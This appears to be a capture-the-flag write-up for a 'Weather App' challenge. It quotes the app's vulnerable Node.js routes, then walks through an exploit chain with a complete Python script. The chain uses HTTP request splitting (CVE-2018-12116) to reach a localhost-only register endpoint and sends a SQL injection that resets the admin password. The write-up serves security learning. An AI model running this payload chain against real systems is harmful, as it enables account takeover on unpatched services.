# Weather App
![Screenshot from 2021-08-19 11-51-31](https://user-images.githubusercontent.com/87865134/130009734-7b87ae67-8224-4654-8bc8-f597d5b60c24.png)

## - Information gathering & Analysis
- `"nodeVersion": "v8.12.0"` => maybe have some CVE 
- router `/api/weather` maybe have SSRF
  - router:
  ```JavaScript
  router.post('/api/weather', (req, res) => {
    let { endpoint, city, country } = req.body;

    if (endpoint && city && country) {
      return WeatherHelper.getWeather(res, endpoint, city, country);
    }

    return res.send(response('Missing parameters'));
  });
  ```
  - WeahterHelper.js:
  ```JavaScript
  let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
  ```
  - HttpHelper.js:
  ```JavaScript
  const http = require('http');

  module.exports = {
    HttpGet(url) {
      return new Promise((resolve, reject) => {
        http.get(url, res => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(body));
            } catch(e) {
              resolve(false);
            }
          });
        }).on('error', reject);
      });
    }
  }
  ```
- router `/register` only use in `localhost` and maybe SQLi
  - router: 
  ```JavaScript
  router.post('/register', (req, res) => {
    if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
      return res.status(401).end();
    }

    let { username, password } = req.body;

    if (username && password) {
      return db.register(username, password)
        .then(()  => res.send(response('Successfully registered')))
        .catch(() => res.send(response('Something went wrong')));
    }

    return res.send(response('Missing parameters'));
  });
  ```
  - database.js:
  ```JavaScript
  async register(user, pass) {
    // TODO: add parameterization and roll public
    return new Promise(async (resolve, reject) => {
      try {
        let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
        resolve((await this.db.run(query)));
      } catch(e) {
        reject(e);
      }
    });
  }
  ```
- **ATTACK**: SQL Injection through SSRF
  - use CVE to perform SSRF
  - use SSRF to send SQLi payload 

## - Exploit
1. Use [CVE-2018-12116 - HTTP Request Splitting](https://www.cvedetails.com/cve/CVE-2018-12116/)
```JavaScript
 http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() {
  });
```
  - `http.get()` split to 2 request:
  ```
  GET / HTTP/1/1
  HOST 127.0.0.1:8000
  
  GET /private
  ...
  ```
2. Payload to perform SQLi
- bypass SQL
```
INSERT INTO users (username, password) VALUES ('admin', 'ndqk') ON CONFLICT(username) DO UPDATE SET password='dgkim' where username='admin' -- ')
```
- request:
```
POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 126

username=admin&password=k%27%29+ON+CONFLICT%28username%29+DO+UPDATE+SET+password%3D%27dgkim%27+where+username%3D%27admin%27+--
```

3. Use Http request splitting to perform SSRF
- python script:
```python
import requests

crlf = '\u010D\u010A'
space = '\u0120'
payload = ''

# request 1
payload += space + 'HTTP/1.1' + crlf; 
payload += 'Host:' + space + '127.0.0.1' + crlf; 
payload += 'Connection:' + space + 'close' + crlf + crlf; 

# request to exploit
payload += 'POST' + space + '/register' + space + 'HTTP/1.1' + crlf; 
payload += 'Host:' + space + '127.0.0.1' + crlf; 
payload += 'Connection:' + space + 'close' + crlf; 
payload += 'Content-Type:' + space + 'application/x-www-form-urlencoded' + crlf; 
payload += 'Content-Length:' + space + '126' + crlf + crlf
payload += 'username=admin&password=k%27%29+ON+CONFLICT%28username%29+DO+UPDATE+SET+password%3D%27admin%27+where+username%3D%27admin%27+--'
payload += crlf + crlf

# request 3
payload += 'GET' + space + '/'

data = {
    'endpoint': '127.0.0.1',
    'city' : payload,
    'country' : 'aaa'
}

url = 'http://139.59.166.56:31316/api/weather'
print(requests.post(url, json=data))


```

4. Login with admin account to get flag   

![Screenshot from 2021-08-19 13-28-40](https://user-images.githubusercontent.com/87865134/130019008-0de3e833-668d-4d31-9541-30533637aaac.png)

## - Description
> ***category:***
  - Components with know vulnerabilities
  - Sever-side Request Forgery
  - SQL injection

## - Reference
- https://hackerone.com/reports/409943
- https://www.cvedetails.com/cve/CVE-2018-12116/
